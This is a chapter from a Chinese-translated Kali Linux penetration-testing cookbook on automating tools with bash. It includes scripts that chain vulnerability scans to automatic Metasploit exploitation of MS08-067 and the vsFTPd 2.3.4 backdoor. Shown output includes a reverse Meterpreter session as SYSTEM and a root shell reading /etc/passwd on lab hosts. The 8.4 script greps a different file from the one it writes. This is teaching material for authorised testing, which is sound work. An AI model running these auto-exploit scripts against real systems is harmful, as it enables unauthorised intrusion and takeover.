# 第八章 自动化 Kali 工具

> 作者：Justin Hutchens

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

Kali Linux 渗透测试平台提供了大量高效的工具，来完成企业渗透测试中所需的大多数常见任务。 然而，有时单个工具不足以完成给定的任务。 与构建完全新的脚本或程序来完成具有挑战性的任务相比，编写使用现有工具以及按需修改其行为的脚本通常更有效。 实用的本地脚本的常见类型包括用于分析或管理现有工具的输出，将多个工具串联到一起的脚本，或者必须顺序执行的多线程任务的脚本。 

## 8.1 的 Nmap greppable 输出分析

Nmap 被大多数安全专业人员认为是 Kali Linux 平台中最流畅和有效的工具之一。 但是由于这个工具的惊人和强大的功能，全面的端口扫描和服务识别可能非常耗时。 在整个渗透测试中，不针对不同的服务端口执行目标扫描，而是对所有可能的 TCP 和 UDP 服务执行全面扫描，然后仅在整个评估过程中引用这些结果，是一个更好的方法。 Nmap 提供了 XML 和 greppable 输出格式来辅助这个过程。

理想情况下，你应该熟悉这些格式，你可以从输出文件中按需提取所需的信息。 但是作为参考，此秘籍会提供示例脚本，可用于提取标识为在指定端口上运行服务的所有 IP 地址。

### 准备

要使用本秘籍中演示的脚本，你需要使用 grepable 格式的 Nmap 输出结果。 这可以通过执行 Nmap 端口扫描并使用`-oA`选项输出所有格式，或`-oG`来专门输出 greppable 格式来获取。 在提供的示例中，多个系统在单个`/24`子网上扫描，这包括 Windows XP 和 Metasploitable2。 有关设置 Metasploitable2 的更多信息，请参阅本书第一章中的“安装 Metasploitable2”秘籍。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 操作步骤

下面的示例演示了使用 bash 脚本语言甚至是 bash 命令行界面（CLI），从 Nmap 输出的 greppable 格式中提取信息，这十分简单：

```sh
#! /bin/bash

if [ ! $1 ]; then echo "Usage: #./script <port #> <filename>"; 
exit; fi

port=$1 
file=$2

echo "Systems with port $port open:"

grep $port $file | grep open | cut -d " " -f 2 
```

为了确保你能理解脚本的功能，我们将按顺序对每一行进行讲解。 脚本的第一行只指向 bash 解释器，以便脚本可以独立执行。 脚本的第二行是一个`if ... then`条件语句，用于测试是否向脚本提供了任何参数。 这只是最小的输入验证，以确保脚本用户知道工具的使用。 如果工具在没有提供任何参数的情况下执行，脚本将`echo`其使用的描述，然后退出。 使用描述会请求两个参数，包括或端口号和文件名。

接下来的两行将每个输入值分配给更易于理解的变量。 第一个输入值是端口号，第二个输入值是 Nmap 输出文件。 然后，脚本将检查 Nmap greppable 输出文件，来判断指定端口号的服务上运行了什么系统（如果有的话）。

```
root@KaliLinux:~# ./service_identifier.sh Usage: #./script <port #> <filename>
```

当你在没有任何参数的情况下执行脚本时，将输出用法描述。 要使用脚本，我们需要输入一个要检查的端口号和 Nmap grepable 输出文件的文件名。 提供的示例在`/ 24`网络上执行扫描，并使用文件名`netscan.txt`生成 greppable 输出文件。 然后，该脚本用于分析此文件，并确定各个端口上的活动服务中是否能发现任何主机。

```
root@KaliLinux:~# ./service_identifier.sh 80 netscan.txt 
Systems with port 80 open: 
172.16.36.135 
172.16.36.225 
root@KaliLinux:~# ./service_identifier.sh 22 netscan.txt 
Systems with port 22 open: 
172.16.36.135 
172.16.36.225 172.16.36.239 
root@KaliLinux:~# ./service_identifier.sh 445 netscan.txt 
Systems with port 445 open: 
172.16.36.135 
172.16.36.225 
```

所展示的示例执行脚本来判断端口 80, 22 和 445 上所运行的主机。脚本的输出显示正在评估的端口号，然后列出输出文件中任何系统的IP地址，这些系统在该端口上运行活动服务。

### 工作原理

`grep`是一个功能强大的命令行工具，可在 bash 中用于  从输出或从给定文件中提取特定内容。 在此秘籍提供的脚本中，`grep`用于从 Nmap grepable 输出文件中提取给定端口号的任何实例。 因为`grep`函数的输出包括多条信息，所以输出通过管道传递到`cut`函数，来提取 IP 地址，然后将其输出到终端。

## 8.2 使用指定 NSE 脚本的 Nmap 端口扫描

许多Nmap脚本引擎（NSE）的脚本仅适用于在指定端口上运行的服务。 考虑`smb-check-vulns.nse`脚本的用法。 此脚本将评估在 TCP 445 端口上运行的 SMB 服务的常见服务漏洞。 如果此脚本在整个网络上执行，则必须重新完成任务来确定端口 445 是否打开，以及每个目标系统上是否可访问 SMB 服务。 这是在评估的扫描阶段期间可能已经完成的任务。 Bash 脚本可以用于利用现有的 Nmap greppable 输出文件来运行服务特定的 NSE 脚本，它们只针对运行这些服务的系统。 在本秘籍中，我们将演示如何使用脚本来确定在先前扫描结果中运行 TCP 445 上的服务的主机，然后仅针对这些系统运行`smb-check-vulns.nse`脚本。

### 准备

要使用本秘籍中演示的脚本，你需要使用 grepable 格式的 Nmap 输出结果。 这可以通过执行 Nmap 端口扫描并使用`-oA`选项输出所有格式，或`-oG`来专门输出 greppable 格式来获取。 在提供的示例中，多个系统在单个`/24`子网上扫描，这包括 Windows XP 和 Metasploitable2。 有关设置 Metasploitable2 的更多信息，请参阅本书第一章中的“安装 Metasploitable2”秘籍。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 操作步骤

下面的示例演示了如何使用 bash 脚本将多个任务串联在一起。 这里，我们需要执行 Nmap grepable 输出文件的分析，然后由该任务标识的信息用于针对不同的系统执行 Nmap NSE 脚本。 具体来说，第一个任务将确定哪些系统在 TCP 445 上运行服务，然后针对每个系统执行`smb-check-vulns.nse`脚本。

```
#! /bin/bash

if [ ! $1 ]; then echo "Usage: #./script <file>"; exit; fi

file=$1

for x in $(grep open $file | grep 445 | cut -d " " -f 2); 
    do nmap --script smb-check-vulns.nse -p 445 $x --scriptargs=unsafe=1; 
done 
```

为了确保你能理解脚本的功能，我们将按顺序讲解每一行。 前几行与上一个秘籍中讨论的脚本类似。 第一行指向 bash 解释器，第二行检查是否提供参数，第三行将输入值赋给易于理解的变量名。 脚本的正文有一定区分。 `for`循环用于遍历通过`grep`函数获取的 IP 地址列表。 从`grep`函数输出的 IP 地址列表对应在 TCP 端口 445 上运行服务的所有系统。然后对这些 IP 地址中的每一个执行 Nmap NSE 脚本。 通过仅在先前已标识为在 TCP 445 上运行服务的系统上运行此脚本，执行 NSE 扫描所需的时间大大减少。

```
root@KaliLinux:~# ./smb_eval.sh 
Usage: #./script <file>
```

通过执行不带任何参数的脚本，脚本将输出用法描述。 该描述表明，应当提供现有 Nmap grepable 输出文件的文件名。 当提供 Nmap 输出文件时，脚本快速分析文件来查找具有 TCP 445 服务的任何系统，然后在每个系统上运行 NSE 脚本，并将结果输出到终端。

```
root@KaliLinux:~# ./smb_eval.sh netscan.txt
Starting Nmap 6.25 ( http://nmap.org ) at 2014-04-10 05:45 EDT 
Nmap scan report for 172.16.36.135 
Host is up (0.00035s latency). 
PORT    STATE SERVICE 
445/tcp open  microsoft-ds 
MAC Address: 00:0C:29:3D:84:32 (VMware)

Host script results: 
| smb-check-vulns: 
|   Conficker: UNKNOWN; not Windows, or Windows with disabled browser service (CLEAN); or Windows with crashed browser service (possibly INFECTED). 
|   
|  If you know the remote system is Windows, try rebooting it and scanning 
|   
|_ again. (Error NT_STATUS_OBJECT_NAME_NOT_FOUND) 
|   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE

|   MS06-025: NO SERVICE (the Ras RPC service is inactive) 
|_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)

Nmap done: 1 IP address (1 host up) scanned in 5.21 seconds

Starting Nmap 6.25 ( http://nmap.org ) at 2014-04-10 05:45 EDT 
Nmap scan report for 172.16.36.225 
Host is up (0.00041s latency). 
PORT    STATE SERVICE 
445/tcp open  microsoft-ds 
MAC Address: 00:0C:29:18:11:FB (VMware)

Host script results: 
| smb-check-vulns: 
|   MS08-067: VULNERABLE 
|   Conficker: Likely CLEAN 
|   regsvc DoS: NOT VULNERABLE 
|   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE 
|   MS06-025: NO SERVICE (the Ras RPC service is inactive) 
|_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)

Nmap done: 1 IP address (1 host up) scanned in 5.18 seconds 
```

在提供的示例中，脚本会传递到`netscan.txt`输出文件。 对文件进行快速分析后，脚本确定两个系统正在端口445上运行服务。然后使用`smb-check-vulns.nse`脚本扫描每个服务，并在终端中生成输出。

### 工作原理

通过提供`grep`序列作为`for`循环要使用的值，此秘籍中的 bash 脚本基本上只是循环遍历该函数的输出。 通过独立运行该函数，可以看到它只提取对应运行 SMB 服务的主机的 IP 地址列表。 然后，`for`循环遍历这些IP地址，并对每个 IP 地址执行 NSE 脚本。

## 8.3 使用 MSF 漏洞利用的 Nmap MSE 漏洞扫描

在某些情况下，开发一个将漏洞扫描与利用相结合的脚本可能会有所帮助。 漏洞扫描通常会导致误报，因此通过执行漏洞扫描的后续利用，可以立即验证这些发现的正确性。 此秘籍使用 bash 脚本来执行`smb-check-vulns.nse`脚本，来确定主机是否存在 MS08-067 NetAPI 漏洞，并且如果 NSE 脚本显示如此，Metasploit 会用于 自动尝试利用它来验证。

### 准备

要使用本秘籍中演示的脚本，你需要使用 grepable 格式的 Nmap 输出结果。 这可以通过执行 Nmap 端口扫描并使用`-oA`选项输出所有格式，或`-oG`来专门输出 greppable 格式来获取。 在提供的示例中，多个系统在单个`/24`子网上扫描，这包括 Windows XP 和 Metasploitable2。 有关设置 Metasploitable2 的更多信息，请参阅本书第一章中的“安装 Metasploitable2”秘籍。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 操作步骤

下面的示例演示了如何使用 bash 脚本将漏洞扫描和目标利用的任务串联到一起。 在这种情况下，`smb-checkvulns.nse`脚本用于确定系统是否容易受到 MS08-067 攻击，然后如果发现系统存在漏洞，则对系统执行相应的 Metasploit 漏洞利用。

```sh
#! /bin/bash

if [ ! $1 ]; then echo "Usage: #./script <RHOST> <LHOST> <LPORT>"; 
exit; fi

rhost=$1 
lhost=$2 
lport=$3

nmap --script smb-check-vulns.nse -p 445 $rhost --scriptargs=unsafe=1 -oN tmp_output.txt 
if [ $(grep MS08-067 tmp_output.txt | cut -d " " -f 5) = "VULNERABLE" ];
    then echo "$rhost appears to be vulnerable, exploiting with Metasploit...";   
    msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/ meterpreter/reverse_tcp RHOST=$rhost LHOST=$lhost LPORT=$lport E; 
fi 
rm tmp_output.txt  
```

为了确保你能理解脚本的功能，我们将按顺序对每一行进行讲解。脚本中的前几行与本章前面讨论的脚本相同。第一行定义解释器，第二行测试输入，第三，第四和第五行都用于根据用户输入定义变量。在此脚本中，提供的用户变量对应 Metasploit 中使用的变量。 `RHOST`变量应该定义目标的 IP 地址，`LHOST`变量应该定义反向监听器的 IP 地址，`LPORT`变量应该定义正在监听的本地端口。然后脚本在正文中执行的第一个任务是，对目标系统的 IP 地址执行`smb-check-vulns.nse`脚本，它由`RHOST`输入定义。然后，结果以正常格式输出到临时文本文件。然后，`if ... then`条件语句与`grep`函数结合使用，来测试输出文件中是否有唯一的字符串，它表明系统存在漏洞。如果发现了唯一的字符串，则脚本会显式系统看起来存在漏洞，然后使用 Metasploit 框架命令行界面（MSFCLI）使用 Meterpreter 载荷执行 Metasploit 漏洞利用。最后，在加载漏洞利用后，使用`rm`函数从文件系统中删除 Nmap 临时输出文件。`test_n_xploit.sh bash`命令执行如下：

```
root@KaliLinux:~# ./test_n_xploit.sh 
Usage: #./script <RHOST> <LHOST> <LPORT>
```

如果在不提供任何参数的情况下执行脚本，脚本将输出相应的用法。 此使用描述显示，该脚本应以参数`RHOST`，`LHOST`和`LPORT`执行。 这些输入值将用于 Nmap NSE 漏洞扫描和（如果有保证）使用 Metasploit 在目标系统上执行利用。 在以下示例中，脚本用于确定 IP 地址为`172.16.36.225`的主机是否存在漏洞。 如果系统被确定为存在漏洞，则会执行利用，并连接到反向 TCP Meterpreter 处理器，该处理其在 IP 地址`172.16.36.239`的 TCP 端口 4444 上监听系统。

```
root@KaliLinux:~# ./test_n_xploit.sh 172.16.36.225 172.16.36.239 4444

Starting Nmap 6.25 ( http://nmap.org ) at 2014-04-10 05:58 EDT 
Nmap scan report for 172.16.36.225 
Host is up (0.00077s latency). 
PORT    STATE SERVICE 
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:18:11:FB (VMware)

Host script results: 
| smb-check-vulns: 
|   MS08-067: VULNERABLE 
|   Conficker: Likely CLEAN 
|   regsvc DoS: NOT VULNERABLE 
|   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE 
|   MS06-025: NO SERVICE (the Ras RPC service is inactive) 
|_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)

Nmap done: 1 IP address (1 host up) scanned in 5.61 seconds 172.16.36.225 appears to be vulnerable, exploiting with Metasploit... 
[*] Please wait while we load the module tree...
     ,           ,    
    /             \  
   ((__---,,,---__))   
      (_) O O (_)_________    
         \ _ /            |\    
          o_o \   M S F   | \  
               \   _____  |  *    
                |||   WW|||      
                |||     |||
                
Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with Metasploit Pro -- type 'go_pro' to launch it now.

       =[ metasploit v4.6.0-dev [core:4.6 api:1.0] 
+ -- --=[ 1053 exploits - 590 auxiliary - 174 post 
+ -- --=[ 275 payloads - 28 encoders - 8 nops

PAYLOAD => windows/meterpreter/reverse_tcp 
RHOST => 172.16.36.225 
LHOST => 172.16.36.239 
LPORT => 4444

[*] Started reverse handler on 172.16.36.239:4444 
[*] Automatically detecting the target... 
[*] Fingerprint: Windows XP - Service Pack 2 - lang:English 
[*] Selected Target: Windows XP SP2 English (AlwaysOn NX) 
[*] Attempting to trigger the vulnerability... 
[*] Sending stage (752128 bytes) to 172.16.36.225 
[*] Meterpreter session 1 opened (172.16.36.239:4444 -> 172.16.36.225:1130) at 2014-04-10 05:58:30 -0400

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

上面的输出显示，在完成 Nmap NSE 脚本后，将立即执行 Metasploit exploit 模块并在目标系统上返回一个交互式 Meterpreter shell。

### 工作原理

MSFCLI 是 MSF 控制台的有效替代工具，可用于直接从终端执行单行命令，而不是在交互式控制台中工作。 这使得 MSFCLI 对于 bash shell 脚本中的使用是一个很好的功能。 因为可以从 bash 终端执行 NSE 脚本和 MSFCLI，所以可以轻松编写 shell 脚本来将这两个功能组合在一起。

## 8.4 使用 MSF 漏洞利用的 Nessuscmd 漏洞扫描

将 NSE 脚本和 Metasploit 利用结合到一起可以减轻工作量。可由 NSE 脚本测试的漏洞数量明显小于可通过专用漏洞扫描程序（如 Nessus）评估的漏洞数量。 幸运的是，Nessus 有一个名为 Nessuscmd 的命令行工具，也可以在 bash 中轻松访问。 该秘籍演示了如何将 Nessus 定向漏洞扫描与 MSF 自动利用相结合来验证发现。

### 准备

为了使用此秘籍中演示的脚本，你需要访问运行漏洞服务的系统，该服务可以使用 Nessus 进行标识，并且可以使用 Metasploit 进行利用。 提供的示例在 Metasploitable2 服务器上使用 vsFTPd 2.3.4 后门漏洞。 有关设置 Metasploitable2 的更多信息，请参阅本书第一章中的“安装 Metasploitable2”秘籍。

此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 操作步骤

下面的示例演示了如何使用 bash 脚本，将漏洞扫描和目标利用的任务结合到一起。 在这种情况下，Nessuscmd 用于运行 Nessus 插件，测试 vsFTPd 2.3.4 后门，以确定系统是否存在漏洞，然后如果发现系统存在漏洞，则对系统执行相应的 Metasploit 漏洞利用：

```sh
#! /bin/bash

if [ ! $1 ]; then echo "Usage: #./script <RHOST>"; exit; fi

rhost=$1

/opt/nessus/bin/nessuscmd -p 21 -i 55523 $rhost >> tmp_output.txt 
if [ $(grep 55523 output.txt | cut -d " " -f 9) = "55523" ];    
    then echo "$rhost appears to be vulnerable, exploiting with Metasploit...";   
    msfcli exploit/unix/ftp/vsftpd_234_backdoor PAYLOAD=cmd/unix/ 
    interact RHOST=$rhost E; 
fi 
rm tmp_output.txt 
```

脚本的开头非常类似于漏洞扫描和利用脚本，它将 NSE 扫描与前一个秘籍中的 MSF 利用组合在一起。但是，由于在此特定脚本中使用了不同的载荷，因此用户必须提供的唯一参数是`RHOST`值，该值应该是目标系统的 IP 地址。脚本的正文以执行 Nessuscmd 工具开始。 `-p`参数声明正在评估的远程端口，`-i`参数声明插件号。插件 55523 对应 VSFTPd 2.3.4 后门的 Nessus 审计。 然后，Nessuscmd 的输出重定向到一个名为`tmp_output.txt`的临时输出文件。如果目标系统上存在此漏洞，则此脚本的输出将仅返回插件 ID。所以下一行使用`if ... then`条件语句结合`grep`序列，来确定返回的输出中的插件 ID。如果输出中返回了插件ID，表明系统应该存在漏洞，那么将执行相应的 Metasploit 利用模块。

```
root@KaliLinux:~# ./nessuscmd_xploit.sh 
Usage: #./script <RHOST>
```

如果在不提供任何参数的情况下执行脚本，脚本将输出相应的用法。 此使用描述表示，应使用`RHOST`参数执行脚本，它用于定义目标 IP 地址。 此输入值将用于 Nessuscmd 漏洞扫描和（如果存在漏洞）使用 Metasploit 在目标系统上执行利用。 在以下示例中，脚本用于确定 IP 地址为`172.16.36.135`的主机是否存在漏洞。 如果系统被确定为存在漏洞，则将执行该利用，并自动建立与后门的连接。

```
root@KaliLinux:~# ./nessuscmd_xploit.sh 172.16.36.135 
172.16.36.135 appears to be vulnerable, exploiting with Metasploit... 
[*] Initializing modules... 
PAYLOAD => cmd/unix/interact 
RHOST => 172.16.36.135 
[*] Banner: 220 (vsFTPd 2.3.4) 
[*] USER: 331 Please specify the password. 
[+] Backdoor service has been spawned, handling... 
[+] UID: uid=0(root) gid=0(root) 
[*] Found shell. 
[*] Command shell session 1 opened (172.16.36.232:48126 -> 172.16.36.135:6200) at 2014-04-28 00:29:21 -0400

whoami 
root 
cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
sys:x:3:3:sys:/dev:/bin/sh 
sync:x:4:65534:sync:/bin:/bin/sync 
                            **{TRUNCATED}** 
```

因为 Nessuscmd 的输出被重定向到临时文件，而不是使用集成的输出函数，所以没有脚本返回的输出来表明扫描成功，除了一个字符串用于指示系统看起来存在 Metasploit 试图利用的漏洞。 一旦脚本执行完毕，将在目标系统上返回具有`root`权限的交互式 shell。 为了演示这一点，我们使用了`whoami`和`cat`命令。

### 工作原理

Nessuscmd 是 Nessus 漏洞扫描器中包含的命令行工具。 此工具可用于通过直接从终端执行目标扫描，来扫描和评估不同插件的结果。 因为该工具（如 MSFCLI）可以轻易从 bash 终端调用，所以我们很容易构建一个脚本，将两个任务串联到一起，将漏洞扫描与利用相结合。

